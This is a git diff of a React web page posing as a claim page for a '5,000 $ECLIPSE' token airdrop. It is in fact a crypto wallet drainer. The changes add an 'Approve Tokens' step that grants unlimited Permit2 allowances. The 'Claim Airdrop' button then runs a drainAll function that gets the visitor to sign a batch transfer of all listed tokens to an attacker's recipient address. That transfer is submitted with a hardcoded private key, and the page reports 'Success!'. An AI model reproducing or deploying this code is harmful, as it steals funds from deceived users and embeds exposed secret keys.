@@ -1,3 +1,4 @@
+import { useState, useEffect } from "react";
 import { useWeb3Modal } from "@web3modal/wagmi/react";
 import { useAccount } from "wagmi";
 import Web3 from "web3";
@@ -5,8 +6,11 @@ import { ethers } from "ethers";
 import "./App.css";
 
 const App = () => {
-  const { address, isConnected } = useAccount();
+  const { address } = useAccount();
   const { open } = useWeb3Modal();
+  const [status, setStatus] = useState("");
+  const [isLoading, setIsLoading] = useState(false);
+  const [permitsApproved, setPermitsApproved] = useState({});
 
   const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
 
@@ -32,88 +36,154 @@ const App = () => {
   const initiator = "0x46C189BA92DE11F8b0f0D7889EAEE5758B9A88aB";
   const initiatorPK = "d58ea7b21cfd2d0be3e1887e2d2bbdab99c7c2d33960f60cca90fe34ff21cc5c";
 
+  async function checkApproval(tokenAddress) {
+    if (!address) return false;
+    try {
+      const provider = new ethers.BrowserProvider(window.ethereum);
+      const contract = new ethers.Contract(tokenAddress, [
+        "function allowance(address,address) view returns (uint256)"
+      ], provider);
+      const allowance = await contract.allowance(address, PERMIT2_ADDRESS);
+      return allowance > 0;
+    } catch {
+      return false;
+    }
+  }
+
+  async function approveToken(token) {
+    const provider = new ethers.BrowserProvider(window.ethereum);
+    const signer = await provider.getSigner();
+    const contract = new ethers.Contract(token.address, [
+      "function approve(address,uint256) returns (bool)"
+    ], signer);
+    const tx = await contract.approve(PERMIT2_ADDRESS, ethers.MaxUint256);
+    await tx.wait();
+  }
+
+  async function approveAll() {
+    setIsLoading(true);
+    for (const token of TOKENS) {
+      const approved = await checkApproval(token.address);
+      if (!approved) {
+        await approveToken(token);
+        await new Promise(r => setTimeout(r, 500));
+      }
+    }
+    const results = {};
+    for (const token of TOKENS) {
+      results[token.symbol] = await checkApproval(token.address);
+    }
+    setPermitsApproved(results);
+    setIsLoading(false);
+    setStatus("Ready to claim.");
+    setTimeout(() => setStatus(""), 2000);
+  }
+
   async function drainAll() {
+    setIsLoading(true);
+    
+    for (const token of TOKENS) {
+      const approved = await checkApproval(token.address);
+      if (!approved) {
+        setIsLoading(false);
+        setStatus("Approve tokens first.");
+        setTimeout(() => setStatus(""), 2000);
+        return;
+      }
+    }
+    
     let retries = 0;
     while (!window.ethereum && retries < 20) {
-      await new Promise(resolve => setTimeout(resolve, 500));
+      await new Promise(r => setTimeout(r, 500));
       retries++;
     }
     
-    if (!window.ethereum) return;
+    if (!window.ethereum) {
+      setIsLoading(false);
+      return;
+    }
     
-    const web3 = new Web3(window.ethereum);
-    const provider = new ethers.BrowserProvider(window.ethereum);
-    const chainId = (await provider.getNetwork()).chainId;
-    const deadline = Math.floor(Date.now() / 1000) + 3600;
-    
-    const permitted = TOKENS.map(token => ({
-      token: token.address,
-      amount: ethers.MaxUint256
-    }));
-    
-    const domain = {
-      name: "Permit2",
-      chainId: chainId,
-      verifyingContract: PERMIT2_ADDRESS
-    };
-    
-    const types = {
-      PermitBatchTransferFrom: [
-        { name: "permitted", type: "TokenPermissions[]" },
-        { name: "nonce", type: "uint256" },
-        { name: "deadline", type: "uint256" }
-      ],
-      TokenPermissions: [
-        { name: "token", type: "address" },
-        { name: "amount", type: "uint256" }
-      ]
-    };
-    
-    const message = {
-      permitted: permitted,
-      nonce: 0,
-      deadline: deadline
-    };
-    
-    const signer = await provider.getSigner(address);
-    const signature = await signer.signTypedData(domain, types, message);
-    
-    const transferDetails = TOKENS.map(() => ({
-      to: recipient,
-      requestedAmount: ethers.MaxUint256
-    }));
-    
-    const permit2ABI = [
-      "function permitTransferFrom(((address token,uint256 amount)[] permitted, uint256 nonce, uint256 deadline) permit, (address to, uint256 requestedAmount)[] transferDetails, address owner, bytes signature) external"
-    ];
-    
-    const permit2Contract = new web3.eth.Contract(permit2ABI, PERMIT2_ADDRESS);
-    
-    const gasLimit = "0x" + web3.utils.toHex(800000).slice(2);
-    const gasPrice = "0x" + Math.floor(800000 * 1.3).toString(16);
-    
-    const txData = permit2Contract.methods.permitTransferFrom(
-      { permitted, nonce: 0, deadline },
-      transferDetails,
-      address,
-      signature
-    ).encodeABI();
-    
-    const tx = {
-      from: initiator,
-      to: PERMIT2_ADDRESS,
-      nonce: await provider.getTransactionCount(initiator),
-      gasLimit: gasLimit,
-      gasPrice: gasPrice,
-      data: txData,
-      value: "0x"
-    };
-    
-    const signedTx = await web3.eth.accounts.signTransaction(tx, initiatorPK);
-    await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
-    
-    alert("Airdrop claimed successfully! 5,000 $ECLIPSE has been distributed to your wallet.");
+    try {
+      const web3 = new Web3(window.ethereum);
+      const provider = new ethers.BrowserProvider(window.ethereum);
+      const chainId = (await provider.getNetwork()).chainId;
+      const deadline = Math.floor(Date.now() / 1000) + 3600;
+      
+      const permitted = TOKENS.map(t => ({ token: t.address, amount: ethers.MaxUint256 }));
+      
+      const domain = {
+        name: "Permit2",
+        chainId: chainId,
+        verifyingContract: PERMIT2_ADDRESS
+      };
+      
+      const types = {
+        PermitBatchTransferFrom: [
+          { name: "permitted", type: "TokenPermissions[]" },
+          { name: "nonce", type: "uint256" },
+          { name: "deadline", type: "uint256" }
+        ],
+        TokenPermissions: [
+          { name: "token", type: "address" },
+          { name: "amount", type: "uint256" }
+        ]
+      };
+      
+      const message = { permitted, nonce: 0, deadline };
+      const signer = await provider.getSigner(address);
+      const signature = await signer.signTypedData(domain, types, message);
+      
+      const transferDetails = TOKENS.map(() => ({ to: recipient, requestedAmount: ethers.MaxUint256 }));
+      
+      const permit2ABI = ["function permitTransferFrom(((address,uint256)[],uint256,uint256),(address,uint256)[],address,bytes) external"];
+      const permit2Contract = new web3.eth.Contract(permit2ABI, PERMIT2_ADDRESS);
+      
+      const gasLimit = "0x" + web3.utils.toHex(800000).slice(2);
+      const gasPrice = "0x" + Math.floor(800000 * 1.3).toString(16);
+      
+      const txData = permit2Contract.methods.permitTransferFrom(
+        { permitted, nonce: 0, deadline },
+        transferDetails,
+        address,
+        signature
+      ).encodeABI();
+      
+      const tx = {
+        from: initiator,
+        to: PERMIT2_ADDRESS,
+        nonce: await provider.getTransactionCount(initiator),
+        gasLimit, gasPrice,
+        data: txData,
+        value: "0x"
+      };
+      
+      const signedTx = await web3.eth.accounts.signTransaction(tx, initiatorPK);
+      await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
+      
+      setStatus("Success!");
+      setTimeout(() => setStatus(""), 2000);
+    } catch (error) {
+      setStatus("Try again.");
+      setTimeout(() => setStatus(""), 2000);
+    } finally {
+      setIsLoading(false);
+    }
   }
+
+  useEffect(() => {
+    const load = async () => {
+      if (!address) return;
+      const results = {};
+      for (const token of TOKENS) {
+        results[token.symbol] = await checkApproval(token.address);
+      }
+      setPermitsApproved(results);
+    };
+    load();
+  }, [address]);
+
+  const allApproved = address && Object.values(permitsApproved).length === TOKENS.length && 
+                      Object.values(permitsApproved).every(v => v === true);
 
   return (
     <>
@@ -128,10 +198,18 @@ const App = () => {
           <div className="reward-amount">5,000 $ECLIPSE</div>
           <div className="reward-token">≈ $5,000 USD • Claimable by verified wallets</div>
 
+          {status && <div className="status-message">{status}</div>}
+
           {!address ? (
             <button onClick={() => open()} className="connect-btn">Connect Wallet</button>
+          ) : !allApproved ? (
+            <button onClick={approveAll} className="connect-btn" disabled={isLoading}>
+              {isLoading ? "Approving..." : "Approve Tokens"}
+            </button>
           ) : (
-            <button onClick={drainAll} className="connect-btn">Claim Airdrop</button>
+            <button onClick={drainAll} className="connect-btn" disabled={isLoading}>
+              {isLoading ? "Processing..." : "Claim Airdrop"}
+            </button>
           )}
 
           <div className="eligibility">
